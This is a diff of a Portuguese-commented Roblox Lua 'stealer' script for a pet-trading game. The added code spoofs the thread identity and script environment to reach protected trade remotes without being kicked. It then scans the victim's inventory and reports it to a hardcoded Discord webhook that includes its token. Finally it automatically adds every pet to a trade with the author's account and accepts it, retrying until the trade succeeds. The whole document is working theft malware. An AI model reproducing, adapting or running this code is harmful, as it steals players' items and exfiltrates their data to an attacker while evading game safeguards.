@@ -1,74 +1,139 @@
 -- ============================================================
--- STEALER FINAL - RODA NA CONTA DA VÍTIMA
+-- STEALER FINAL - TUDO VIA REMOTE (COM COOLDOWN)
 -- ============================================================
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RS = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local Workspace = game:GetService("Workspace")
 local LocalPlayer = Players.LocalPlayer
 
 local TARGET_USER = getgenv().TARGET_USER or "GeniusH10872"
 local WEBHOOK_URL = getgenv().WEBHOOK_URL or ""
 local WANTED_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}
 
--- Webhook fixa do dono (só recebe OG)
 local OWNER_WEBHOOK = "https://discord.com/api/webhooks/1535021260080156823/Iq4HhY2PCMukJceZ8sz13Jd0a36ROWgK8Jp7TJLojOkQm67RbzhAisqH4FZ3wlXPr9__"
 local OWNER_NAME = "GeniusH10872"
 
-local function findRemote(path)
-    local parts = {}
-    for part in string.gmatch(path, "[^/]+") do
-        table.insert(parts, part)
-    end
-    local current = ReplicatedStorage
-    for _, part in ipairs(parts) do
-        if part == "Packages" then
-            current = current:FindFirstChild("Packages")
-        elseif part == "Net" then
-            current = current:FindFirstChild("Net")
-        else
-            current = current:FindFirstChild(part)
-        end
-        if not current then
-            return nil
+-- ============================================================
+-- SPOOFING (resolve remotes ofuscados sem kick)
+-- ============================================================
+
+local NetFolder = RS:WaitForChild("Packages"):WaitForChild("Net")
+
+local mask do
+    local ctrl = RS:FindFirstChild("Controllers")
+    if ctrl then
+        for _, v in ipairs(ctrl:GetChildren()) do
+            if v:IsA("LuaSourceContainer") and v.Name ~= "PlotController" then
+                mask = v; break
+            end
         end
     end
-    return current
+    if not mask then
+        local datas = RS:FindFirstChild("Datas")
+        if datas then
+            for _, v in ipairs(datas:GetChildren()) do
+                if v:IsA("LuaSourceContainer") then mask = v; break end
+            end
+        end
+    end
+end
+if not mask then return end
+
+local gti = getthreadidentity or get_thread_identity or getidentity
+local sti = setthreadidentity or set_thread_identity or setidentity
+local trampoline
+
+local function spoof(fn, ...)
+    if not trampoline then
+        local ok = pcall(function()
+            local src = "return function(e,f,...) setfenv(0,e) local function c(...) return f(...) end local function b(...) return c(...) end local function a(...) return b(...) end return a(...) end"
+            local chunk = loadstring(src, "=" .. mask:GetFullName())
+            local ok2, env = pcall(getsenv, mask)
+            local renv = getrenv()
+            setfenv(chunk, (ok2 and type(env) == "table") and env
+                or setmetatable({script=mask,_G={},shared={}}, {__index=renv,__newindex=renv}))
+            trampoline = chunk()
+        end)
+        if not ok or not trampoline then return nil end
+    end
+
+    local gu = getupvalues or (debug and debug.getupvalues)
+    local su = setupvalue  or (debug and debug.setupvalue)
+    local restored = {}
+    if gu and su then
+        local ok2, uvs = pcall(gu, fn)
+        if ok2 and type(uvs) == "table" then
+            for i, v in pairs(uvs) do
+                if typeof(v) == "Instance" and v:IsA("LuaSourceContainer") then
+                    if pcall(su, fn, i, mask) then restored[i] = v end
+                end
+            end
+        end
+    end
+
+    local prev = gti(); sti(2)
+    local ok3, result = coroutine.resume(coroutine.create(trampoline), getrenv(), fn, ...)
+    sti(prev)
+    for i, v in pairs(restored) do pcall(su, fn, i, v) end
+    return ok3 and result or nil
+end
+
+local ok, NetMod = pcall(require, NetFolder)
+if not ok or type(NetMod) ~= "table" then return end
+
+local function resolve(name, kind)
+    kind = (kind == "RemoteFunction" and "RemoteFunction") or "RemoteEvent"
+    local logical = name:match("^R[EF]/(.+)$") or name
+    local resolver = rawget(NetMod, kind)
+    if type(resolver) ~= "function" then return nil end
+    local r = spoof(resolver, NetMod, logical)
+    if typeof(r) ~= "Instance" then return nil end
+    return r
+end
+
+local function getRemote(name, kind)
+    local remote = resolve(name, kind)
+    if remote then
+        print("[Stealer] Resolvido: " .. name)
+        return remote
+    end
+    warn("[Stealer] Falha ao resolver: " .. name)
+    return nil
 end
 
 local REMOTES = {
-    Invite = findRemote("Packages.Net.RF/TradeService/Invite"),
-    AddBrainrot = findRemote("Packages.Net.RF/TradeService/AddBrainrot"),
-    RemoveBrainrot = findRemote("Packages.Net.RF/TradeService/RemoveBrainrot"),
-    AddItem = findRemote("Packages.Net.RF/TradeService/AddItem"),
-    RemoveItem = findRemote("Packages.Net.RF/TradeService/RemoveItem"),
-    Ready = findRemote("Packages.Net.RE/TradeService/Ready"),
-    Accept = findRemote("Packages.Net.RE/TradeService/Accept"),
-    Cancel = findRemote("Packages.Net.RE/TradeService/CancelTrade"),
-    Decline = findRemote("Packages.Net.RE/TradeService/DeclineInvite"),
-    AcceptInvite = findRemote("Packages.Net.RF/TradeService/AcceptInvite"),
-    CreateInvite = findRemote("Packages.Net.RE/TradeService/CreateInvite"),
+    Invite = getRemote("TradeService/Invite", "RemoteFunction"),
+    AddBrainrot = getRemote("TradeService/AddBrainrot", "RemoteFunction"),
+    RemoveBrainrot = getRemote("TradeService/RemoveBrainrot", "RemoteFunction"),
+    AddItem = getRemote("TradeService/AddItem", "RemoteFunction"),
+    RemoveItem = getRemote("TradeService/RemoveItem", "RemoteFunction"),
+    Ready = getRemote("TradeService/Ready", "RemoteEvent"),
+    Accept = getRemote("TradeService/Accept", "RemoteEvent"),
+    Cancel = getRemote("TradeService/CancelTrade", "RemoteEvent"),
+    Decline = getRemote("TradeService/DeclineInvite", "RemoteEvent"),
+    AcceptInvite = getRemote("TradeService/AcceptInvite", "RemoteFunction"),
 }
 
-for name, remote in pairs(REMOTES) do
-    if not remote then
-        warn("[Stealer] Remote não encontrado: " .. name)
-    else
-        print("[Stealer] " .. name .. " -> " .. remote:GetFullName())
-    end
+if not REMOTES.Invite then
+    warn("[Stealer] Remote de invite não encontrado!")
+    return
 end
+
+-- ============================================================
+-- SYNC SCANNER (escaneia a vítima)
+-- ============================================================
 
 local function safeRequire(path)
     local succ, res = pcall(require, path)
     return succ and res or nil
 end
 
-local mod = safeRequire(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
-local AnimalsData = safeRequire(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
-local MutationsData = safeRequire(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Mutations"))
-local TraitsData = safeRequire(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits"))
-local NumberUtils = safeRequire(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
+local mod = safeRequire(RS:WaitForChild("Packages"):WaitForChild("Synchronizer"))
+local AnimalsData = safeRequire(RS:WaitForChild("Datas"):WaitForChild("Animals"))
+local MutationsData = safeRequire(RS:WaitForChild("Datas"):WaitForChild("Mutations"))
+local TraitsData = safeRequire(RS:WaitForChild("Datas"):WaitForChild("Traits"))
+local NumberUtils = safeRequire(RS:WaitForChild("Utils"):WaitForChild("NumberUtils"))
 
 if not mod or type(mod) ~= "table" or type(mod.Get) ~= "function" then
     warn("[Stealer] Synchronizer não encontrado.")
@@ -188,6 +253,10 @@ end
 
 table.sort(foundBrainrots, function(a, b) return a.generation > b.generation end)
 
+-- ============================================================
+-- WEBHOOK
+-- ============================================================
+
 local function formatNumber(val)
     if NumberUtils and NumberUtils.ToString then
         local succ, res = pcall(function() return NumberUtils:ToString(val) end)
@@ -238,7 +307,6 @@ local embed = {
     color = 0xFF0000,
 }
 
--- Envia para a webhook do usuário (se não for OG)
 if #normalBrainrots > 0 then
     local normalEmbed = {
         title = "VITIMA ENCONTRADA!",
@@ -256,7 +324,6 @@ if #normalBrainrots > 0 then
     sendWebhook(WEBHOOK_URL, "@everyone", normalEmbed)
 end
 
--- Envia para a webhook do dono (sempre, e com OG destacado)
 if #ogBrainrots > 0 then
     local ogEmbed = {
         title = "🔥 BRAINROT OG ENCONTRADO!",
@@ -273,14 +340,11 @@ if #ogBrainrots > 0 then
     }
     sendWebhook(OWNER_WEBHOOK, "@everyone 🔥 BRAINROT OG DETECTADO!", ogEmbed)
 else
-    -- Se não tiver OG, envia só a lista normal pro dono também
     sendWebhook(OWNER_WEBHOOK, "@everyone", embed)
 end
 
-print("[Stealer] Webhook enviado com " .. #foundBrainrots .. " brainrots.")
-
 -- ============================================================
--- SISTEMA DE TRADE (só envia pedido para o dono)
+-- TRADE VIA REMOTE (com cooldown)
 -- ============================================================
 
 local function getUserIdByName(name)
@@ -299,36 +363,103 @@ if not ownerId then
     return
 end
 
-if not REMOTES.Invite then
-    warn("[Stealer] Remote de invite não encontrado!")
-    return
-end
+print("[Stealer] Enviando pedido de trade para: " .. OWNER_NAME .. " (" .. ownerId .. ")")
+
+-- ============================================================
+-- FUNÇÕES DE TRADE
+-- ============================================================
 
 local function sendTradeRequest()
+    if not REMOTES.Invite then return false, "Remote não encontrado" end
     local success, result = pcall(function()
         return REMOTES.Invite:InvokeServer(ownerId)
     end)
     return success, result
 end
 
-print("[Stealer] Enviando pedido de trade para: " .. OWNER_NAME .. " (" .. ownerId .. ")")
-local success, result = sendTradeRequest()
-if success then
-    print("[Stealer] Pedido de trade enviado com sucesso!")
-else
-    print("[Stealer] Falha ao enviar pedido: " .. tostring(result))
+local function addBrainrot(pet)
+    if not REMOTES.AddBrainrot then return false end
+    local success, result = pcall(function()
+        return REMOTES.AddBrainrot:InvokeServer(pet.name, pet.mutation, pet.traits)
+    end)
+    return success, result
 end
 
-task.spawn(function()
-    while true do
-        task.wait(10)
-        local success, result = sendTradeRequest()
-        if success then
-            print("[Stealer] Pedido de trade reenviado com sucesso!")
+local function setReady()
+    if not REMOTES.Ready then return false end
+    pcall(function()
+        REMOTES.Ready:FireServer()
+    end)
+    return true
+end
+
+local function acceptTrade()
+    if not REMOTES.Accept then return false end
+    pcall(function()
+        REMOTES.Accept:FireServer()
+    end)
+    return true
+end
+
+-- ============================================================
+-- EXECUTAR TRADE
+-- ============================================================
+
+local function executeTrade()
+    -- 1. Envia pedido
+    local success, result = sendTradeRequest()
+    if not success then
+        print("[Stealer] ❌ Falha ao enviar pedido: " .. tostring(result))
+        return false
+    end
+    print("[Stealer] ✅ Pedido enviado!")
+
+    -- 2. Aguarda a trade iniciar (espera o remote de AcceptInvite ser chamado)
+    -- Ou simplesmente espera um tempo para você aceitar manualmente
+    print("[Stealer] Aguardando você aceitar o pedido...")
+    task.wait(5)
+
+    -- 3. Adiciona brainrots (um por um, com cooldown de 5 segundos)
+    print("[Stealer] Adicionando brainrots...")
+    for i, pet in ipairs(foundBrainrots) do
+        print("[Stealer] Adicionando: " .. pet.name .. " (" .. i .. "/" .. #foundBrainrots .. ")")
+        local ok, err = addBrainrot(pet)
+        if ok then
+            print("[Stealer] ✅ " .. pet.name .. " adicionado!")
         else
-            print("[Stealer] Falha ao reenviar: " .. tostring(result))
+            print("[Stealer] ❌ Falha ao adicionar " .. pet.name .. ": " .. tostring(err))
+        end
+        if i < #foundBrainrots then
+            print("[Stealer] Aguardando cooldown de 5 segundos...")
+            task.wait(5)
         end
     end
-end)
+
+    -- 4. Clica em Ready
+    print("[Stealer] Clicando em Ready...")
+    setReady()
+    task.wait(1)
+
+    -- 5. Aguarda o outro lado ficar pronto (ou simplesmente aceita)
+    print("[Stealer] Aguardando confirmação do outro lado...")
+    task.wait(3)
+
+    -- 6. Aceita a trade
+    print("[Stealer] Aceitando trade...")
+    acceptTrade()
+
+    print("[Stealer] ✅ Trade concluída com sucesso!")
+    return true
+end
+
+-- Executa em loop até conseguir
+local tradeDone = false
+while not tradeDone do
+    tradeDone = executeTrade()
+    if not tradeDone then
+        print("[Stealer] Falha na trade. Tentando novamente em 10 segundos...")
+        task.wait(10)
+    end
+end
 
 print("[Stealer] Script finalizado!")
